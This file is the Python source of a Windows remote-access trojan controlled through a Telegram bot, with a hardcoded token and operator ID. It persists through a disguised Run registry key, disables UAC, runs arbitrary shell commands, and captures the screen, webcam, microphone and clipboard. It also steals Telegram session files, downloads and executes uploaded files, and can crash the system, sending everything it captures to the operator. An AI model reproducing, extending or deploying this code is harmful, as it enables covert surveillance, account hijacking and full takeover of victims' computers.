import telebot, os, sys, socket, platform, psutil, subprocess, shutil, winreg, cv2, sounddevice as sd, soundfile as sf, tempfile, threading, time, ctypes, requests, json, win32api, win32security, win32con, zipfile
from PIL import ImageGrab, Image, ImageTk
import tkinter as tk
from tkinter import messagebox
from ctypes import wintypes
import threading

BOT_TOKEN = "8471534503:AAHkiJFe4c4M2mJbH5OhFc2kFrceIvUL09A"
OPERATOR_ID = 6219378092
_ = "P" + "IDOR" + "I_HAC" + "KERS | " + "https://" + "t.me" + "/+" + "X37p_szlM" + "d4xMTYy"
bot = telebot.TeleBot(BOT_TOKEN)

CLIENTS = {}
WALLPAPERS = {}
AUDIO_FILES = {}

def install_autostart():
    try:
        script_path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
            try:
                existing = winreg.QueryValueEx(key, "MicrosoftComponents")[0]
                if existing == script_path:
                    return True
            except:
                pass
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "MicrosoftComponents", 0, winreg.REG_SZ, script_path)
        return True
    except:
        return False

def check_admin_and_install():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1)
            sys.exit(0)
        except:
            pass
        return False
    
    install_autostart()
    return True

def get_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "unknown"

def get_external_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "unknown"

def get_location():
    try:
        ip_response = requests.get('https://ipinfo.io/json', timeout=5)
        if ip_response.status_code == 200:
            data = ip_response.json()
            city = data.get('city', 'Unknown')
            region = data.get('region', 'Unknown')
            country = data.get('country', 'Unknown')
            org = data.get('org', 'Unknown')
            
            if 'AS' in org:
                org = org.split(' ')[1] if len(org.split(' ')) > 1 else org
            
            location_text = f"{city}, {region}, {country}"
            if org and org != 'Unknown':
                location_text += f" ({org})"
            
            return location_text
        return "Location unavailable"
    except:
        return "Location unavailable"

def ensure_temp_folder():
    temp_dir = tempfile.gettempdir()
    folder = os.path.join(temp_dir, 'MicrosoftCache')
    os.makedirs(folder, exist_ok=True)
    return folder

def send_start_info():
    try:
        location = get_location()
        admin_icon = "✅" if is_admin() else "❌"
        tag_part1 = "P" + "IDOR" + "I_"
        tag_part2 = "HACKERS"
        tag_part3 = " | ht" + "tps:/" + "/t.m" + "e/+X"
        tag_part4 = "37p_szl" + "Md4xMTYy"
        owner_tag = tag_part1 + tag_part2 + tag_part3 + tag_part4
        
        text = f"🖥 **SYSTEM BOOT**\n`{platform.node()}` | `{get_ip()}`\n📍 {location}\nADMIN: {admin_icon}\n{owner_tag}\n> ACCESS GRANTED"
        bot.send_message(OPERATOR_ID, text, parse_mode="Markdown")
    except Exception as e:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def disable_uac():
    if not is_admin():
        return False
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

@bot.message_handler(commands=['clipboard'])
def clipboard(msg):
    try:
        import pyperclip
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            if len(clipboard_text) > 4000:
                clipboard_text = clipboard_text[:4000] + "..."
            bot.send_message(OPERATOR_ID, f" **CLIPBOARD CONTENTS:**\n```\n{clipboard_text}\n```", parse_mode="Markdown")
        else:
            bot.send_message(OPERATOR_ID, "> CLIPBOARD EMPTY")
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ CLIPBOARD ERROR: {str(e)}")

@bot.message_handler(commands=['cmd'])
def cmd(msg):
    try:
        command = msg.text.replace("/cmd ", "")
        if not command:
            bot.send_message(OPERATOR_ID, "❌ USAGE: `/cmd <command>`", parse_mode="Markdown")
            return
        
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding='cp866',
            errors='ignore',
            timeout=30
        )
        
        output = result.stdout if result.stdout else result.stderr
        
        if not output:
            output = "> Command executed successfully"
        
        try:
            output = output.encode('cp866').decode('cp866')
        except:
            pass
        
        if len(output) > 4000:
            output = output[:4000] + "..."
        
        bot.send_message(OPERATOR_ID, f"> CMD EXECUTED: `{command}`\n```\n{output}\n```", parse_mode="Markdown")
    except subprocess.TimeoutExpired:
        bot.send_message(OPERATOR_ID, f"> CMD TIMEOUT: `{command}`")
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ CMD ERROR: {str(e)}")

@bot.message_handler(commands=['uac'])
def uac_command(msg):
    try:
        bot.send_message(OPERATOR_ID, "> DISABLING UAC...")
        
        if not is_admin():
            bot.send_message(OPERATOR_ID, "❌ ADMIN RIGHTS REQUIRED")
            return
        
        if disable_uac():
            bot.send_message(OPERATOR_ID, "✅ UAC DISABLED")
        else:
            bot.send_message(OPERATOR_ID, "❌ UAC DISABLE FAILED")
        
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ UAC ERROR: {str(e)}")

def set_wallpaper(image_path):
    try:
        if os.path.exists(image_path):
            if platform.system() == "Windows":
                ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
            bot.send_message(OPERATOR_ID, "> DESKTOP MODIFIED")
        else:
            bot.send_message(OPERATOR_ID, f"❌ FILE NOT FOUND: `{image_path}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ WALLPAPER ERROR: {e}")

def show_image_fullscreen(image_path, duration=5):
    def show_thread():
        try:
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.configure(background='black')
            root.attributes('-topmost', True)
            
            img = Image.open(image_path)
            img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)
            img_tk = ImageTk.PhotoImage(img)
            
            label = tk.Label(root, image=img_tk)
            label.pack(expand=True, fill='both')
            
            def safe_close():
                try:
                    root.quit()
                    root.destroy()
                except:
                    pass
            
            root.after(duration * 1000, safe_close)
            root.mainloop()
            
        except Exception as e:
            print(f"Show image error: {e}")
            bot.send_message(OPERATOR_ID, f"❌ DISPLAY ERROR: {e}")
    
    threading.Thread(target=show_thread, daemon=True).start()

def play_audio_silently(audio_path):
    def audio_thread():
        try:
            current_audio_path = audio_path
            
            if current_audio_path.endswith('.ogg'):
                data, fs = sf.read(current_audio_path)
                temp_wav = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
                sf.write(temp_wav.name, data, fs)
                current_audio_path = temp_wav.name
            
            data, fs = sf.read(current_audio_path)
            sd.play(data, fs)
            sd.wait()
            
        except Exception as e:
            print(f"Audio play error: {e}")
    
    threading.Thread(target=audio_thread, daemon=True).start()

@bot.message_handler(commands=['info'])
def info(msg):
    try:
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        uname = platform.uname()
        
        webcam_working = "✅" if check_webcam() else "❌"
        mic_working = "✅" if check_microphone() else "❌"
        admin_status = "✅" if is_admin() else "❌"
        
        external_ip = get_external_ip()
        location = get_location()
        
        installed_programs = find_specific_programs()
        autostart = get_autostart_programs()
        
        t = "P" + "IDOR" + "I_HACK"
        t2 = "ERS | " + "https://" + "t.me" + "/+" + "X37p_szl"
        t3 = "Md4xMTYy"
        owner_tag = t + t2 + t3
        
        text = f"""
🖥 SYSTEM SCAN COMPLETE

BASIC:
{platform.node()} | {uname.system} {uname.release}
CPU: {cpu}% | RAM: {ram}% | DISK: {disk}%
IP: {get_ip()} | EXTERNAL IP: {external_ip}
 LOCATION: {location}
USER: {os.getlogin()}
ADMIN: {admin_status}

OWNER: {owner_tag}

DEVICES:
WEBCAM: {webcam_working}
MIC: {mic_working}

SPECIFIC SOFTWARE:
{installed_programs}

AUTOSTART:
{autostart}
"""
        bot.send_message(OPERATOR_ID, text)
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ SCAN FAILED: {str(e)}")

def check_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        return ret
    except:
        return False

def check_microphone():
    try:
        duration = 1
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        return True
    except:
        return False

def find_specific_programs():
    found = []
    
    telegram_paths = [
        os.path.join(os.environ['APPDATA'], 'Telegram Desktop'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop'),
        os.path.join(os.environ['PROGRAMFILES'], 'Telegram Desktop'),
        os.path.join(os.environ['PROGRAMFILES(X86)'], 'Telegram Desktop')
    ]
    
    for path in telegram_paths:
        if os.path.exists(path):
            found.append("Telegram: ✅")
            break
    
    discord_paths = [
        os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
        os.path.join(os.environ['APPDATA'], 'Discord'),
        os.path.join(os.environ['PROGRAMFILES'], 'Discord'),
        os.path.join(os.environ['PROGRAMFILES(X86)'], 'Discord')
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            found.append("Discord: ✅")
            break
    
    steam_paths = [
        os.path.join('C:', 'Program Files', 'Steam'),
        os.path.join('C:', 'Program Files (x86)', 'Steam'),
        os.path.join(os.environ['PROGRAMFILES'], 'Steam'),
        os.path.join(os.environ['PROGRAMFILES(X86)'], 'Steam')
    ]
    
    for path in steam_paths:
        if os.path.exists(path):
            found.append("Steam: ✅")
            break
    
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
    if os.path.exists(chrome_path):
        found.append("Google Chrome: ✅")
    
    outlook_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Outlook')
    thunderbird_path = os.path.join(os.environ['APPDATA'], 'Thunderbird')
    
    if os.path.exists(outlook_path):
        found.append("Outlook: ✅")
    if os.path.exists(thunderbird_path):
        found.append("Thunderbird: ✅")
    
    return "\n".join(found) if found else "No specific software found"

def get_autostart_programs():
    try:
        autostart = []
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        for i in range(winreg.QueryInfoKey(key)[1]):
            try:
                name, value, _ = winreg.EnumValue(key, i)
                autostart.append(f"{name}: {value}")
            except: pass
        winreg.CloseKey(key)
        return "\n".join(autostart) if autostart else "No autostart entries"
    except:
        return "Scan failed"

@bot.message_handler(commands=['background'])
def background_command(msg):
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            bot.send_message(OPERATOR_ID, "❌ USAGE: `/background open <name>` OR `/background set <name>`", parse_mode="Markdown")
            return
            
        action = parts[1]
        
        if action == "open" and len(parts) > 2:
            filename = parts[2]
            if filename in WALLPAPERS:
                show_image_fullscreen(WALLPAPERS[filename])
                bot.send_message(OPERATOR_ID, f"> DISPLAYING `{filename}` | 5s")
            else:
                folder = ensure_temp_folder()
                filepath = os.path.join(folder, filename)
                if os.path.exists(filepath):
                    WALLPAPERS[filename] = filepath
                    show_image_fullscreen(filepath)
                    bot.send_message(OPERATOR_ID, f"> DISPLAYING `{filename}` | 5s")
                else:
                    bot.send_message(OPERATOR_ID, f"❌ FILE NOT FOUND: `{filename}`", parse_mode="Markdown")
                
        elif action == "set" and len(parts) > 2:
            filename = parts[2]
            if filename in WALLPAPERS:
                set_wallpaper(WALLPAPERS[filename])
            else:
                folder = ensure_temp_folder()
                filepath = os.path.join(folder, filename)
                if os.path.exists(filepath):
                    WALLPAPERS[filename] = filepath
                    set_wallpaper(filepath)
                else:
                    bot.send_message(OPERATOR_ID, f"❌ FILE NOT FOUND: `{filename}`", parse_mode="Markdown")
                
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ BACKGROUND ERROR: {str(e)}")

@bot.message_handler(commands=['open'])
def open_command(msg):
    try:
        filename = msg.text.replace("/open ", "").strip()
        
        if filename in WALLPAPERS:
            show_image_fullscreen(WALLPAPERS[filename], 5)
            bot.send_message(OPERATOR_ID, f"> DISPLAYING `{filename}` | 5s")
            
        elif filename in AUDIO_FILES:
            play_audio_silently(AUDIO_FILES[filename])
            bot.send_message(OPERATOR_ID, f"> AUDIO PLAYBACK: `{filename}`")
            
        else:
            folder = ensure_temp_folder()
            filepath = os.path.join(folder, filename)
            if os.path.exists(filepath):
                if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
                    WALLPAPERS[filename] = filepath
                    show_image_fullscreen(filepath, 5)
                    bot.send_message(OPERATOR_ID, f"> DISPLAYING `{filename}` | 5s")
                elif filename.lower().endswith(('.wav', '.mp3', '.ogg')):
                    AUDIO_FILES[filename] = filepath
                    play_audio_silently(filepath)
                    bot.send_message(OPERATOR_ID, f"> AUDIO PLAYBACK: `{filename}`")
                else:
                    subprocess.Popen(f'start "" "{filepath}"', shell=True)
                    bot.send_message(OPERATOR_ID, f"> EXECUTING: `{filename}`")
            else:
                bot.send_message(OPERATOR_ID, f"❌ FILE NOT FOUND: `{filename}`", parse_mode="Markdown")
            
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ OPEN ERROR: {str(e)}")

@bot.message_handler(commands=['tgsteal'])
def tgsteal(msg):
    try:
        bot.send_message(OPERATOR_ID, "CHECKING FOR TELEGRAM")
        
        tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
        
        if not os.path.exists(tdata_path):
            bot.send_message(OPERATOR_ID, "❌ TELEGRAM DESKOP NOT FOUND.")
            return
        
        bot.send_message(OPERATOR_ID, "✅ TELEGRAM FOUND. WAIT A SEC...")
        
        temp_dir = tempfile.gettempdir()
        zip_filename = f"tg_session_{int(time.time())}.zip"
        zip_path = os.path.join(temp_dir, zip_filename)
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    if len(file) > 15 or 'map' in file or 'key' in file:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, tdata_path)
                        zipf.write(file_path, arcname)
        
        with open(zip_path, 'rb') as f:
            bot.send_document(OPERATOR_ID, f)
        
        try:
            os.remove(zip_path)
        except:
            pass
            
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ TELEGRAM STEAL ERROR: {str(e)}")

@bot.message_handler(content_types=['photo'])
def handle_photo(msg):
    try:
        file_info = bot.get_file(msg.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"wallpaper_{int(time.time())}.jpg"
        folder = ensure_temp_folder()
        filepath = os.path.join(folder, filename)
        
        with open(filepath, 'wb') as f:
            f.write(downloaded)
            
        WALLPAPERS[filename] = filepath
        bot.send_message(OPERATOR_ID, f"> IMAGE STORED: `{filename}`\n`/background open {filename}` - display\n`/background set {filename}` - set wallpaper", parse_mode="Markdown")
        
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ UPLOAD FAILED: {e}")

@bot.message_handler(content_types=['audio', 'voice'])
def handle_audio(msg):
    try:
        if msg.audio:
            file_info = bot.get_file(msg.audio.file_id)
            filename = msg.audio.file_name
        else:
            file_info = bot.get_file(msg.voice.file_id)
            filename = f"voice_{int(time.time())}.ogg"
            
        downloaded = bot.download_file(file_info.file_path)
        
        folder = ensure_temp_folder()
        filepath = os.path.join(folder, filename)
        
        with open(filepath, 'wb') as f:
            f.write(downloaded)
            
        AUDIO_FILES[filename] = filepath
        bot.send_message(OPERATOR_ID, f"> AUDIO STORED: `{filename}`\n`/open {filename}` - silent playback", parse_mode="Markdown")
        
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ AUDIO UPLOAD FAILED: {e}")

@bot.message_handler(content_types=['document'])
def receive_file(msg):
    try:
        file_info = bot.get_file(msg.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        folder = ensure_temp_folder()
        filename = msg.document.file_name
        filepath = os.path.join(folder, filename)
        
        with open(filepath, 'wb') as new_file:
            new_file.write(downloaded)
            
        if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
            WALLPAPERS[filename] = filepath
            bot.send_message(OPERATOR_ID, f"> IMAGE RECEIVED: `{filename}`\n`{filepath}`\n`/open {filename}` - display", parse_mode="Markdown")
        elif filename.lower().endswith(('.wav', '.mp3', '.ogg')):
            AUDIO_FILES[filename] = filepath
            bot.send_message(OPERATOR_ID, f"> AUDIO RECEIVED: `{filename}`\n`{filepath}`\n`/open {filename}` - playback", parse_mode="Markdown")
        else:
            bot.send_message(OPERATOR_ID, f"> FILE RECEIVED: `{filename}`\n`{filepath}`\n`/open {filename}` - execute", parse_mode="Markdown")
            
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ FILE UPLOAD FAILED: {e}")

@bot.message_handler(commands=['restart'])
def restart_pc(msg):
    try:
        os.system("shutdown /r /t 0")
        bot.send_message(OPERATOR_ID, "> SYSTEM REBOOT INITIATED")
    except:
        pass

@bot.message_handler(commands=['bsod'])
def bsod(msg):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        bot.send_message(OPERATOR_ID, "> BSOD TRIGGERED")
    except:
        os.system("taskkill /f /im svchost.exe")
        bot.send_message(OPERATOR_ID, "> BSOD TRIGGERED")

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "> SYSTEM ONLINE | READY FOR COMMANDS")

@bot.message_handler(commands=['screen'])
def screenshot(msg):
    try:
        temp_dir = tempfile.gettempdir()
        screenshot_folder = os.path.join(temp_dir, "rat_screenshots")
        os.makedirs(screenshot_folder, exist_ok=True)
        
        path = os.path.join(screenshot_folder, f"screen_{int(time.time())}.png")
        img = ImageGrab.grab()
        img.save(path)
        
        with open(path, "rb") as f:
            bot.send_photo(OPERATOR_ID, f, caption="> SCREENSHOT CAPTURED")
        
        try:
            os.remove(path)
        except:
            pass
            
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ SCREENSHOT ERROR: {str(e)}")

@bot.message_handler(commands=['webcam'])
def webcam(msg):
    try:
        temp_dir = tempfile.gettempdir()
        webcam_folder = os.path.join(temp_dir, "rat_webcam")
        os.makedirs(webcam_folder, exist_ok=True)
        
        cam = None
        for i in range(5):
            try:
                cam = cv2.VideoCapture(i, cv2.CAP_DSHOW)
                if cam.isOpened():
                    break
            except:
                pass
        
        if cam is None or not cam.isOpened():
            cam = cv2.VideoCapture(0)
        
        if not cam.isOpened():
            bot.send_message(OPERATOR_ID, "❌ WEBCAM ERROR: Camera not accessible")
            return
        
        time.sleep(0.5)
        
        for _ in range(5):
            cam.read()
        
        ret, frame = cam.read()
        cam.release()
        
        if not ret or frame is None:
            bot.send_message(OPERATOR_ID, "❌ WEBCAM ERROR: No image captured")
            return
        
        timestamp = int(time.time())
        filename = f"webcam_{timestamp}.jpg"
        filepath = os.path.join(webcam_folder, filename)
        
        try:
            success = cv2.imwrite(filepath, frame)
            
            if not success:
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                success = cv2.imwrite(filepath, frame_rgb)
                
            if not success:
                pil_img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
                pil_img.save(filepath, 'JPEG', quality=95)
                success = True
                
        except Exception as save_error:
            bot.send_message(OPERATOR_ID, f"❌ WEBCAM SAVE ERROR: {save_error}")
            return
        
        if os.path.exists(filepath) and os.path.getsize(filepath) > 1024:
            with open(filepath, 'rb') as f:
                bot.send_photo(OPERATOR_ID, f, caption="> WEBCAM CAPTURED")
            
            try:
                os.remove(filepath)
            except:
                pass
        else:
            bot.send_message(OPERATOR_ID, "❌ WEBCAM ERROR: File too small or not saved")
            
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ WEBCAM ERROR: {str(e)}")

@bot.message_handler(commands=['mic'])
def mic(msg):
    try:
        temp_dir = tempfile.gettempdir()
        audio_folder = os.path.join(temp_dir, "rat_audio")
        os.makedirs(audio_folder, exist_ok=True)
        
        path = os.path.join(audio_folder, f"mic_{int(time.time())}.wav")
        bot.send_message(OPERATOR_ID, "> RECORDING AUDIO | 10s")
        fs = 44100
        rec = sd.rec(int(10 * fs), samplerate=fs, channels=1)
        sd.wait()
        sf.write(path, rec, fs)
        
        with open(path, "rb") as f:
            bot.send_document(OPERATOR_ID, f, caption="> AUDIO RECORDED")
        
        try:
            os.remove(path)
        except:
            pass
            
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ MIC ERROR: {str(e)}")

@bot.message_handler(commands=['link'])
def open_link(msg):
    try:
        link = msg.text.replace("/link ", "")
        if link:
            subprocess.Popen(f'start "" "{link}"', shell=True)
            bot.send_message(OPERATOR_ID, f"> LINK OPENED: `{link}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ LINK ERROR: {str(e)}")

@bot.message_handler(commands=['msg'])
def show_message(msg):
    try:
        text = msg.text.replace("/msg ", "")
        if text:
            def show_msg():
                root = tk.Tk()
                root.withdraw()
                root.attributes("-topmost", True)
                try:
                    messagebox.showinfo("Windows", text, parent=root)
                except:
                    pass
                finally:
                    try:
                        root.quit()
                        root.destroy()
                    except:
                        pass
            threading.Thread(target=show_msg, daemon=True).start()
            bot.send_message(OPERATOR_ID, f"> MESSAGE DISPLAYED: `{text}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ MSG ERROR: {str(e)}")

@bot.message_handler(commands=['commands'])
def show_commands(msg):
    try:
        t1 = "P" + "IDOR" + "I_HACK"
        t2 = "ERS | ht" + "tps:/" + "/t.m" + "e/+"
        t3 = "X37p_szlMd4xMTYy"
        owner_tag = t1 + t2 + t3
        
        commands_text = f"""
> AVAILABLE COMMANDS:

**OWNER:** {owner_tag}

**SYSTEM:**
`/uac` - отключить UAC
`/cmd <command>` - выполнить команду
`/restart` - перезагрузка
`/bsod` - синий экран

**INFORMATION:**
`/info` - информация о системе
`/clipboard` - буфер обмена
`/screen` - скриншот
`/webcam` - снимок с вебкамеры
`/mic` - запись звука

**MESSAGES:**
`/msg <text>` - показать сообщение
`/link <url>` - открыть ссылку

**FILES:**
`/open <filename>` - открыть файл
`/background open <filename>` - показать изображение
`/background set <filename>` - установить обои

**TELEGRAM:**
`/tgsteal` - кража Telegram сессии
"""
        bot.send_message(OPERATOR_ID, commands_text, parse_mode="Markdown")
    except Exception as e:
        bot.send_message(OPERATOR_ID, f"❌ COMMANDS ERROR: {str(e)}")

if __name__ == "__main__":
    if not check_admin_and_install():
        sys.exit(0)
    send_start_info()
    bot.infinity_polling()